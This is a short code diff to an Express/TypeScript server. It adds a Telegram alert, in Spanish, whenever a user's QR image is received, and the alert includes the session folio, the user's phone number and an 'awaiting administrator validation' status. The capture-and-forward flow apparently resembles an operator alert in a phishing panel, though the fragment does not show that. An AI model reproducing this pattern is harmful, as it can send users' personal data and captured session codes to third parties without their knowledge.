@@ -1591,6 +1591,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 const sessionData = await storage.getSessionById(sessionId);
                 const qrCreatedBy = sessionData?.createdBy || '';
                 
+                // Enviar notificación a Telegram
+                const qrMessage = `📱 <b>CÓDIGO QR RECIBIDO (Flujo QR)</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `📞 <b>Teléfono:</b> ${sessionData?.celular || 'No proporcionado'}\n` +
+                  `📷 <b>QR:</b> Imagen capturada correctamente\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
+                  `⚠️ <b>Estado:</b> Esperando validación de administrador`;
+                sendTelegramMessage(qrMessage);
+                
                 broadcastToAdmins(JSON.stringify({
                   type: 'QR_RECEIVED',
                   data: { 
